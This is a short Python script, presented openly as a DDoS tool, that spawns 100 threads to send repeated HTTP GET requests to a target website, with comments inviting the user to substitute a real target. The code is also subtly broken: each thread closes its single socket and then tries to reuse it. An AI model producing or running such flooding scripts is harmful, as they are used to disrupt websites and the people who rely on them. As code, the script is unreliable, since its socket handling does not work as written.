import socket
import threading
import time

def ddos(target, port, duration):
    # Create a socket object
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Get the IP address of the target
    ip = socket.gethostbyname(target)

    # Start the attack
    start_time = time.time()
    while True:
        if time.time() - start_time > duration:
            break
        try:
            # Send a packet to the target
            client.connect((ip, port))
            client.sendto(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n", (ip, port))
        except Exception as e:
            print(f"Error: {e}")
        finally:
            client.close()

# Example usage
target = "example.com"  # Replace with the target website
port = 80  # You can change this to 443 for HTTPS
duration = 1  # Duration of the attack in seconds

# Create multiple threads to simulate a DDoS attack
threads = []
for _ in range(100):
    thread = threading.Thread(target=ddos, args=(target, port, duration))
    thread.start()
    threads.append(thread)

# Wait for all threads to finish
for thread in threads:
    thread.join()